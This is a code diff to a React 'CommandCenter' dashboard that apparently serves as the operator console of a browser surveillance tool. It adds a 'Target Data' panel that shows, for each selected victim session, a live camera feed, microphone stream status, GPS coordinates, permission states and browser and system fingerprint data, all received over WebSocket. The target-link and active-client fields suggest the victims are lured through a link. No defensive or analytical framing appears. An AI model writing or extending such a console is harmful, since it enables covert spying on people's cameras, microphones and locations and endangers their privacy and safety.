@@ -16,6 +16,13 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
   const [activeClients, setActiveClients] = useState<any[]>([]);
   const [selectedClient, setSelectedClient] = useState<string | null>(null);
   const [targetLink, setTargetLink] = useState<string>("");
+  const [targetData, setTargetData] = useState<any>({
+    camera: null,
+    microphone: null,
+    location: null,
+    systemInfo: null,
+    permissions: {}
+  });
   const { toast } = useToast();
 
   const { isConnected, sendMessage } = useWebSocket({
@@ -40,6 +47,42 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
               ? { ...client, ...message.data }
               : client
           ));
+          
+          // Update target data for selected client
+          if (selectedClient === message.sessionId) {
+            setTargetData(prev => ({
+              ...prev,
+              ...message.data
+            }));
+          }
+        } else if (message.type === 'camera_stream' && message.sessionId) {
+          if (selectedClient === message.sessionId) {
+            setTargetData(prev => ({
+              ...prev,
+              camera: message.stream
+            }));
+          }
+        } else if (message.type === 'microphone_data' && message.sessionId) {
+          if (selectedClient === message.sessionId) {
+            setTargetData(prev => ({
+              ...prev,
+              microphone: message.data
+            }));
+          }
+        } else if (message.type === 'location_data' && message.sessionId) {
+          if (selectedClient === message.sessionId) {
+            setTargetData(prev => ({
+              ...prev,
+              location: message.data
+            }));
+          }
+        } else if (message.type === 'system_info_data' && message.sessionId) {
+          if (selectedClient === message.sessionId) {
+            setTargetData(prev => ({
+              ...prev,
+              systemInfo: message.data
+            }));
+          }
         }
       } catch (error) {
         console.error('Error handling WebSocket message:', error);
@@ -266,8 +309,9 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
           </Card>
         </div>
 
-        {/* Active Clients */}
-        <div className="mt-6">
+        {/* Active Clients and Target Data */}
+        <div className="mt-6 grid grid-cols-1 lg:grid-cols-2 gap-6">
+          {/* Active Clients */}
           <Card className="bg-slate-800 border-slate-600">
             <CardHeader>
               <CardTitle className="text-slate-200 flex items-center">
@@ -340,7 +384,143 @@ export function CommandCenter({ onExit, onViewData }: CommandCenterProps) {
               )}
             </CardContent>
           </Card>
+
+          {/* Target Data */}
+          <Card className="bg-slate-800 border-slate-600">
+            <CardHeader>
+              <CardTitle className="text-slate-200 flex items-center">
+                <Monitor className="text-red-400 mr-2" />
+                Target Data
+              </CardTitle>
+            </CardHeader>
+            <CardContent>
+              {!selectedClient ? (
+                <div className="text-center py-8 text-slate-400">
+                  <Monitor className="mx-auto mb-4 text-4xl" />
+                  <p>Select a client to view target data</p>
+                </div>
+              ) : (
+                <div className="space-y-4">
+                  {/* Camera Feed */}
+                  {targetData.camera && (
+                    <div className="bg-slate-900 rounded-lg p-4">
+                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                        <Camera className="w-4 h-4 mr-2" />
+                        Live Camera Feed
+                      </h4>
+                      <div className="bg-black rounded aspect-video flex items-center justify-center">
+                        <video 
+                          ref={(video) => {
+                            if (video && targetData.camera) {
+                              video.srcObject = targetData.camera;
+                            }
+                          }}
+                          autoPlay 
+                          muted 
+                          className="w-full h-full object-cover rounded"
+                        />
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Microphone Data */}
+                  {targetData.microphone && (
+                    <div className="bg-slate-900 rounded-lg p-4">
+                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                        <Mic className="w-4 h-4 mr-2" />
+                        Microphone Access
+                      </h4>
+                      <div className="flex items-center space-x-4">
+                        <div className="w-4 h-4 bg-green-400 rounded-full animate-pulse"></div>
+                        <span className="text-green-400 text-sm">Audio stream active</span>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Location Data */}
+                  {targetData.location && (
+                    <div className="bg-slate-900 rounded-lg p-4">
+                      <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                        <MapPin className="w-4 h-4 mr-2" />
+                        Location Data
+                      </h4>
+                      <div className="space-y-1 text-sm">
+                        <p><span className="text-slate-400">Latitude:</span> {targetData.location.latitude}</p>
+                        <p><span className="text-slate-400">Longitude:</span> {targetData.location.longitude}</p>
+                        <p><span className="text-slate-400">Accuracy:</span> {targetData.location.accuracy}m</p>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Permission Status */}
+                  <div className="bg-slate-900 rounded-lg p-4">
+                    <h4 className="text-red-400 font-medium mb-2 flex items-center">
+                      <Shield className="w-4 h-4 mr-2" />
+                      Permission Status
+                    </h4>
+                    <div className="space-y-2">
+                      {Object.entries(targetData.permissions).map(([permission, granted]) => (
+                        <div key={permission} className="flex items-center space-x-2">
+                          <div className={`w-3 h-3 rounded-full ${granted ? 'bg-green-400' : 'bg-red-400'}`}></div>
+                          <span className="text-sm text-slate-400 capitalize">{permission}</span>
+                          <Badge className={`${granted ? 'bg-green-500' : 'bg-red-500'} bg-opacity-20 text-xs`}>
+                            {granted ? 'Granted' : 'Denied'}
+                          </Badge>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                </div>
+              )}
+            </CardContent>
+          </Card>
         </div>
+
+        {/* System Information */}
+        {selectedClient && targetData.systemInfo && (
+          <div className="mt-6">
+            <Card className="bg-slate-800 border-slate-600">
+              <CardHeader>
+                <CardTitle className="text-slate-200 flex items-center">
+                  <Monitor className="text-green-400 mr-2" />
+                  System Information
+                </CardTitle>
+              </CardHeader>
+              <CardContent>
+                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div className="bg-slate-900 rounded-lg p-4">
+                    <h4 className="text-green-400 font-medium mb-2">Browser Details</h4>
+                    <div className="space-y-1 text-sm">
+                      <p><span className="text-slate-400">User Agent:</span></p>
+                      <p className="text-slate-300 text-xs break-all">{targetData.systemInfo.userAgent}</p>
+                      <p><span className="text-slate-400">Platform:</span> {targetData.systemInfo.platform}</p>
+                      <p><span className="text-slate-400">Language:</span> {targetData.systemInfo.language}</p>
+                    </div>
+                  </div>
+                  
+                  <div className="bg-slate-900 rounded-lg p-4">
+                    <h4 className="text-green-400 font-medium mb-2">Display Information</h4>
+                    <div className="space-y-1 text-sm">
+                      <p><span className="text-slate-400">Screen Resolution:</span> {targetData.systemInfo.screenWidth}x{targetData.systemInfo.screenHeight}</p>
+                      <p><span className="text-slate-400">Color Depth:</span> {targetData.systemInfo.colorDepth}-bit</p>
+                      <p><span className="text-slate-400">Timezone:</span> {targetData.systemInfo.timezone}</p>
+                    </div>
+                  </div>
+                  
+                  <div className="bg-slate-900 rounded-lg p-4">
+                    <h4 className="text-green-400 font-medium mb-2">Capabilities</h4>
+                    <div className="space-y-1 text-sm">
+                      <p><span className="text-slate-400">HTTPS:</span> {targetData.systemInfo.isHttps ? 'Yes' : 'No'}</p>
+                      <p><span className="text-slate-400">Cookies:</span> {targetData.systemInfo.cookieEnabled ? 'Enabled' : 'Disabled'}</p>
+                      <p><span className="text-slate-400">Online:</span> {targetData.systemInfo.onLine ? 'Yes' : 'No'}</p>
+                      <p><span className="text-slate-400">WebRTC:</span> {targetData.systemInfo.webRTC ? 'Available' : 'Not Available'}</p>
+                    </div>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+          </div>
+        )}
       </div>
     </div>
   );
